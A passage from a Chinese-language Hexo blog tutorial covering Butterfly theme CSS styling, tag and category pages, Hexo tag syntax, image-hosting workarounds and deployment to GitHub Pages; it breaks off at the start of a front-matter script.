class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文章页背景</span></span><br><span class="line"><span class="selector-class">.layout_post</span></span><br><span class="line">  &amp; &gt; <span class="selector-id">#post</span></span><br><span class="line">    <span class="attribute">background</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">8</span>)</span><br><span class="line"><span class="comment">// 所有页面背景</span></span><br><span class="line"><span class="selector-id">#aside_content</span> <span class="selector-class">.card-widget</span>,</span><br><span class="line">#recent-posts&gt;<span class="selector-class">.recent-post-item</span>,</span><br><span class="line">.layout_page&gt;<span class="selector-tag">div</span><span class="selector-pseudo">:first-child</span><span class="selector-pseudo">:not</span>(.recent-posts),</span><br><span class="line">.layout_post&gt;<span class="selector-id">#page</span>,</span><br><span class="line">.layout_post&gt;<span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-class">.read-mode</span> .layout_post&gt;<span class="selector-id">#post</span></span><br><span class="line">  <span class="attribute">background</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 侧边卡片的透明度</span></span><br><span class="line"><span class="selector-pseudo">:root</span></span><br><span class="line">  <span class="attr">--card-bg</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">8</span>)</span><br><span class="line">  <span class="attr">--card-hover-box-shadow</span> <span class="number">0</span> <span class="number">3px</span> <span class="number">8px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(<span class="number">7</span>, <span class="number">17</span>, <span class="number">27</span>, <span class="number">0.2</span>)</span><br><span class="line">  <span class="attr">--guole-main</span> <span class="number">#49b1f5</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span></span><br><span class="line">  <span class="attr">--card-bg</span> <span class="built_in">rgba</span>(<span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, .<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页脚透明</span></span><br><span class="line"><span class="selector-id">#footer</span></span><br><span class="line">  <span class="attribute">background</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文章页H1-H6图标样式效果</span></span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h1</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ef50a8</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h2</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fb7061</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h3</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffbf00</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h4</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a9e000</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h5</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#57c850</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"><span class="selector-id">#content-inner</span><span class="selector-class">.layout</span> <span class="selector-tag">h6</span><span class="selector-pseudo">::before</span></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#5ec1e0</span> ;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1.55rem</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: -<span class="number">0.23rem</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 小风车旋转</span></span><br><span class="line"><span class="selector-tag">h1</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h2</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h3</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h4</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h5</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">h6</span><span class="selector-pseudo">::before</span></span><br><span class="line">  -webkit-<span class="attribute">animation</span> ccc <span class="number">1.6s</span> linear infinite</span><br><span class="line">  <span class="attribute">animation</span> ccc <span class="number">1.6s</span> linear infinite</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 代码块样式 */</span></span><br><span class="line"><span class="selector-id">#article-container</span></span><br><span class="line">  <span class="selector-tag">figure</span></span><br><span class="line">    &amp;<span class="selector-class">.highlight</span></span><br><span class="line">      <span class="attribute">border-radius</span> <span class="number">7px</span></span><br><span class="line">      -webkit-<span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">144</span>, <span class="number">164</span>, <span class="number">174</span>, .<span class="number">4</span>)</span><br><span class="line">      <span class="attribute">box-shadow</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">144</span>, <span class="number">164</span>, <span class="number">174</span>, .<span class="number">4</span>)</span><br><span class="line">      -webkit-<span class="attribute">transform</span> <span class="built_in">translateZ</span>(<span class="number">0</span>)</span><br><span class="line">      <span class="selector-class">.highlight-tools</span></span><br><span class="line">        <span class="selector-class">.code-lang</span></span><br><span class="line">          <span class="attribute">left</span> <span class="number">75px</span></span><br><span class="line">        <span class="selector-class">.expand</span></span><br><span class="line">          <span class="attribute">right</span> <span class="number">0</span></span><br><span class="line">          &amp; ~ <span class="selector-class">.copy-button</span></span><br><span class="line">            <span class="attribute">right</span> <span class="number">2.1em</span></span><br><span class="line">        <span class="selector-pseudo">&amp;:after</span></span><br><span class="line">          <span class="attribute">position</span> absolute</span><br><span class="line">          <span class="attribute">left</span> <span class="number">14px</span></span><br><span class="line">          <span class="attribute">width</span> <span class="number">12px</span></span><br><span class="line">          <span class="attribute">height</span> <span class="number">12px</span></span><br><span class="line">          <span class="attribute">border-radius</span> <span class="number">50%</span></span><br><span class="line">          <span class="attribute">background</span> <span class="number">#fc625d</span></span><br><span class="line">          -webkit-<span class="attribute">box-shadow</span> <span class="number">20px</span> <span class="number">0</span> <span class="number">#fdbc40</span>, <span class="number">40px</span> <span class="number">0</span> <span class="number">#35cd4b</span></span><br><span class="line">          <span class="attribute">box-shadow</span> <span class="number">20px</span> <span class="number">0</span> <span class="number">#fdbc40</span>, <span class="number">40px</span> <span class="number">0</span> <span class="number">#35cd4b</span></span><br><span class="line">          <span class="attribute">content</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment">/* 目录-当前节点 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span></span><br><span class="line">  <span class="selector-id">#card-toc</span></span><br><span class="line">    <span class="selector-class">.toc-content</span></span><br><span class="line">      <span class="selector-class">.toc-link</span></span><br><span class="line">        &amp;<span class="selector-class">.active</span></span><br><span class="line">          <span class="attribute">background-color</span> <span class="built_in">var</span>(--guole-main)</span><br><span class="line">          <span class="attribute">border-radius</span> <span class="number">8px</span></span><br><span class="line"><span class="comment">/* 不需要前缀 keyframes放最后 否则打包之后的css有问题 */</span></span><br><span class="line"><span class="keyword">@keyframes</span> ccc</span><br><span class="line">  <span class="number">0%</span></span><br><span class="line">    -webkit-<span class="attribute">transform</span> <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">    <span class="attribute">transform</span> <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">  <span class="number">100%</span></span><br><span class="line">    -webkit-<span class="attribute">transform</span> <span class="built_in">rotate</span>(-<span class="number">1turn</span>)</span><br><span class="line">    <span class="attribute">transform</span> <span class="built_in">rotate</span>(-<span class="number">1turn</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="页面（写作）"><a href="#页面（写作）" class="headerlink" title="页面（写作）"></a>页面（写作）</h3><h4 id="新建-标签-和分类-页面"><a href="#新建-标签-和分类-页面" class="headerlink" title="新建 标签 和分类 页面"></a>新建 <strong>标签</strong> 和<strong>分类</strong> 页面</h4><ul><li>只要在 source 文件夹下新建.md文件，并且文章前面按如下格式表明所属分类和标签就行：</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">自学编程成功概率有多少可能</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2017-05-26 19:57:47</span></span><br><span class="line"><span class="attr">tags:</span> [<span class="string">编程</span>,<span class="string">感悟</span>]</span><br><span class="line"><span class="attr">categories:</span> <span class="string">技术</span> </span><br></pre></td></tr></table></figure><ul><li>先根目录输入命令 <code>hexo new page categories</code> 会自动新建 categorier 文件夹并生成一个index.md文件，里面的代码为：</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-01-30 23:10:51</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">categories</span> <span class="comment"># 手动添加 否则侧边栏的个人信息中的分类进入页面没有内容</span></span><br></pre></td></tr></table></figure><p>同理，「标签」也一样 <code>hexo new page tags</code> 生成 tags 文件夹，其中会自动生成一个index.md文件,代码为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-01-30 23:14:51</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">tags</span> <span class="comment"># 手动添加 否则侧边栏的个人信息中的标签进入页面没有内容</span></span><br></pre></td></tr></table></figure><ul><li>然后 我们发表文章使用「tags」「categories」只需在文章开头添加如下代码：</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">利用GitHub和HEXO免费搭建个人博客高级</span> <span class="string">美化篇</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2019-01-29 22:58:56</span></span><br><span class="line"><span class="attr">tags:</span> [<span class="string">hexo建站</span>,<span class="string">hexo部署</span>,<span class="string">github部署</span>,<span class="string">个人博客</span>]      <span class="comment">#添加的标签</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">hexo博客</span>                              <span class="comment">#添加的分类</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><h4 id="gitee防盗链图片无法显示"><a href="#gitee防盗链图片无法显示" class="headerlink" title="gitee防盗链图片无法显示"></a>gitee防盗链图片无法显示</h4><p><strong>添加标签只能针对img  背景图还是不能  只能换个云服务做图床</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">referrer</span>=<span class="string">&quot;no-referrer|origin|unsafe-url&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;item.src&#125;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/zzcyeah/p/anti-leech.html">防盗链</a></p><p><strong>① 图片少量时，可以将图片统一放在<font color="red"><code>source/images</code></font>文件夹中，通过<code>![替代文字](/images/image.jpg)</code>来访问。</strong></p><p><strong>② 打开站点配置文件，设置<code>post_asset_folder</code>为<code>true</code>。运行<code>npm install hexo-asset-image –save</code>，安装上传图片的插件。安装完成后，再运行<code>hexo new xxx</code>来生成md文件时，<code>/source/_posts</code>文件夹内除了<code>xxx.md</code>文件还有一个同名的文件夹，这个文件夹用来存放博文中用到的图片，引用图片时通过正常语法<code>![替代文字](xxx.png)</code>引用。</strong></p><h4 id="报错-Context-Dump"><a href="#报错-Context-Dump" class="headerlink" title="报错 Context Dump"></a>报错 Context Dump</h4><p>因为文章中出现里写了<code>&#123;&#123;&#125;&#125;</code> <a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a> 的文章渲染使用的是 <code>Nunjucks</code> ，因为在使用<code>mathjax</code>公式，造成了<code>&#123; &#123;</code>重叠，而它会在生成文章时将那几个大括号识别成自己的语法，这样就会报错。</p><p><strong>用空格隔开就好</strong>；</p><h4 id="hexo语法"><a href="#hexo语法" class="headerlink" title="hexo语法"></a>hexo语法</h4><h5 id="带颜色的引用"><a href="#带颜色的引用" class="headerlink" title="带颜色的引用"></a>带颜色的引用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note class_name %&#125; 文字内容 (md class_name supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note primary %&#125; 文字内容 (md primary supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note default %&#125; 文字内容 (md default supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note success %&#125; 文字内容 (md success supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note info %&#125; 文字内容 (md info supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note warning %&#125; 文字内容 (md warning supported) &#123;% endnote %&#125;</span><br><span class="line">&#123;% note danger %&#125; 文字内容 (md danger supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p><strong>展示效果</strong></p><div class="note class_name flat"><p>文字内容 (md class_name supported) </p></div><div class="note primary flat"><p>文字内容 (md primary supported) </p></div><div class="note default flat"><p>文字内容 (md default supported) </p></div><div class="note success flat"><p>文字内容 (md success supported) </p></div><div class="note info flat"><p>文字内容 (md info supported) </p></div><div class="note warning flat"><p>文字内容 (md warning supported) </p></div><div class="note danger flat"><p>文字内容 (md danger supported) </p></div><h5 id="图标-可以在Font-Awesome官网查找ICO图标，然后通过class方法添加。"><a href="#图标-可以在Font-Awesome官网查找ICO图标，然后通过class方法添加。" class="headerlink" title="图标 可以在Font Awesome官网查找ICO图标，然后通过class方法添加。"></a>图标 <strong>可以在<a href="https://fontawesome.com/v4.7.0/icons/">Font Awesome官网</a>查找ICO图标，然后通过class方法添加。</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;i class=&quot;fa fa-pencil&quot;&gt;&lt;/i&gt; 铅笔</span><br><span class="line">&lt;i class=&quot;fa fa-cloud-upload&quot;&gt;&lt;/i&gt; 上传</span><br><span class="line">&lt;i class=&quot;fa fa-download&quot;&gt;&lt;/i&gt; 下载</span><br><span class="line">&lt;i class=&quot;fa fa-download fa-lg&quot;&gt;&lt;/i&gt; 下载变大 33%</span><br><span class="line">&lt;i class=&quot;fa fa-download fa-2x&quot;&gt;&lt;/i&gt; 下载两倍大</span><br></pre></td></tr></table></figure><p><strong>展示效果</strong></p><p><i class="fa fa-pencil"></i> 铅笔</p><p><i class="fa fa-cloud-upload"></i> 上传</p><p><i class="fa fa-download"></i> 下载</p><p><i class="fa fa-download fa-lg"></i> 下载变大 33%</p><p><i class="fa fa-download fa-2x"></i> 下载两倍大</p><h5 id="设置文字颜色"><a href="#设置文字颜色" class="headerlink" title="设置文字颜色"></a>设置文字颜色</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;font color=&quot;red&quot;&gt;&lt;big&gt;测试内容&lt;/big&gt;&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#0000FF&quot;&gt;测试内容&lt;/font&gt;</span><br><span class="line">&lt;span style=&#x27;padding: 1px 4px;color:#26c6da;background-color: rgba(77,208,225,.08);border-radius:4px&#x27;&gt;蓝绿色？&lt;/span&gt;</span><br><span class="line">&lt;span style=&#x27;padding: 1px 4px;color:#ff502c;background-color: #fff5f5;border-radius:4px&#x27;&gt;红色&lt;/span&gt;</span><br></pre></td></tr></table></figure><p><strong>展示效果</strong></p><p><font color="red"><big>测试内容</big></font></p><p><font color="#0000FF">测试内容</font></p><p><span style='padding: 1px 4px;color:#26c6da;background-color: rgba(77,208,225,.08);border-radius:4px'>蓝绿色？</span></p><p><span style='padding: 1px 4px;color:#ff502c;background-color: #fff5f5;border-radius:4px'>红色</span></p><h5 id="居中和右对齐"><a href="#居中和右对齐" class="headerlink" title="居中和右对齐"></a>居中和右对齐</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;center&gt;内容居中&lt;/center&gt;</span><br><span class="line">&lt;div style=&quot;text-align:right&quot;&gt;内容右对齐&lt;/div&gt;</span><br><span class="line">&lt;div align=&quot;left&quot;&gt; 左对齐！&lt;/div&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;居中对齐！&lt;/div&gt;</span><br><span class="line">&lt;div align=&quot;right&quot;&gt;右对齐！&lt;/div&gt;</span><br><span class="line">&lt;div align=&quot;justify &quot;&gt;伸展行 文字间隔！&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>展示效果</strong></p><center>内容居中</center><div style="text-align:right">内容右对齐</div><div align="left"> 左对齐！</div><div align="center">居中对齐！</div><div align="right">右对齐！</div><div align="justify ">伸展行 文字间隔！</div><h5 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs 选项卡, 2 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**这是选项卡 1** 呵呵哈哈哈哈哈哈</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**这是选项卡 2** 额。。。</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**这是选项卡 3** 哇，你找到我了！</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p><strong>展示效果</strong></p><div class="tabs" id="选项卡"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#选项卡-1">选项卡 1</button></li><li class="tab active"><button type="button" data-href="#选项卡-2">选项卡 2</button></li><li class="tab"><button type="button" data-href="#选项卡-3">选项卡 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="选项卡-1"><p><strong>这是选项卡 1</strong> 呵呵哈哈哈哈哈哈</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="选项卡-2"><p><strong>这是选项卡 2</strong> 额。。。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="选项卡-3"><p><strong>这是选项卡 3</strong> 哇，你找到我了！</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h4 id="引入-codepen"><a href="#引入-codepen" class="headerlink" title="引入 codepen"></a>引入 codepen</h4><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/codepen1.png" alt="codepen1"></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/codepen2.png" alt="codepen2"></p><p class="codepen" data-height="300" data-default-tab="result" data-slug-hash="JjBwzQE" data-editable="true" data-user="hisai3" style="height: 300px; box-sizing: border-box; display: flex; align-items: center; justify-content: center; border: 2px solid; margin: 1em 0; padding: 1em;">  <span>See the Pen <a href="https://codepen.io/hisai3/pen/JjBwzQE">  自动运行</a> by hisai3 (<a href="https://codepen.io/hisai3">@hisai3</a>)  on <a href="https://codepen.io">CodePen</a>.</span></p><script async src="https://cpwebassets.codepen.io/assets/embed/ei.js"></script><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p><a href="https://hexo.io/zh-cn/docs/github-pages">部署  github + hexo</a></p><h4 id="一、github-创建仓库-（部署之后访问-https-username-github-io-仓库名-）"><a href="#一、github-创建仓库-（部署之后访问-https-username-github-io-仓库名-）" class="headerlink" title="一、github 创建仓库 （部署之后访问 https://username.github.io/仓库名/）"></a>一、<code>github</code> 创建仓库 （<strong>部署之后访问</strong> <a href="https://username.github.io/%E4%BB%93%E5%BA%93%E5%90%8D/%EF%BC%89">https://username.github.io/仓库名/）</a></h4><blockquote><p>github 提交超时 使用ssh</p></blockquote><ul><li><strong>ssh-keygen -t rsa -C “邮箱”</strong></li></ul><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/gen-sshkey.png" alt="shhkey-gen"></p><ul><li><strong>cat ~&#x2F;.ssh&#x2F;id_rsa.pub</strong>  获取sshkey</li></ul><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/get-sshkey.png" alt="shhkey-get"></p><ul><li>github添加sshkey</li></ul><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/github-sshkey.png" alt="github-sshkey"></p><h4 id="二、修改-github-pages"><a href="#二、修改-github-pages" class="headerlink" title="二、修改 github pages"></a>二、修改 <code>github pages</code></h4><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/github-pages.png" alt="github-pages"></p><h4 id="三、修改配置文件-config-yml"><a href="#三、修改配置文件-config-yml" class="headerlink" title="三、修改配置文件 _config.yml"></a>三、修改配置文件 <code>_config.yml</code></h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:username/hisai.git</span> </span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># root 自己加 否则访问时报错, css或js样式无法显示</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://username.github.io/username.github.io</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br></pre></td></tr></table></figure><h4 id="四、部署提交"><a href="#四、部署提交" class="headerlink" title="四、部署提交"></a>四、部署提交</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清缓存 (修改配置 或者 页面不刷新使用)</span></span><br><span class="line">hexo clean</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">构建public</span></span><br><span class="line">hexo g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发布</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p><strong>部署之后需要等待一下 刷新</strong></p><h3 id="theme主题备份上传失败"><a href="#theme主题备份上传失败" class="headerlink" title="theme主题备份上传失败"></a>theme主题备份上传失败</h3><p>现象： 讲整个博客项目提交到git上，发现主题包只剩下一个空文件夹</p><p>解决：</p><ol><li>将主题包中的 .git 文件移出，放置桌面</li><li>清缓存 git rm –cached themes&#x2F;主题包名</li><li>重新执行 git 提交代码命令</li><li>最后将 .git 文件放回主题包中</li></ol><p>可以先复制一份用于blog, 需要更新就先pull再跟复制的合并，否则每次都要重复上面的操作</p><h3 id="批量添加文章头部"><a href="#批量添加文章头部" class="headerlink" title="批量添加文章头部"></a>批量添加文章头部</h3><h4 id="1、将脚本放到需要处理的文件夹中执行即可"><a href="#1、将脚本放到需要处理的文件夹中执行即可" class="headerlink" title="1、将脚本放到需要处理的文件夹中执行即可"></a>1、将脚本放到需要处理的文件夹中执行即可</h4><h4 id="2、规则以当前文章的路径上一级为分类和标签"><a href="#2、规则以当前文章的路径上一级为分类和标签" class="headerlink" title="2、规则以当前文章的路径上一级为分类和标签"></a>2、规则以当前文章的路径上一级为分类和标签</h4><blockquote><p>当前文章路径：…..&#x2F;Vue&#x2F;指令.md</p><p>title: 指令</p><p>categories: Vue </p><p>tags: Vue </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 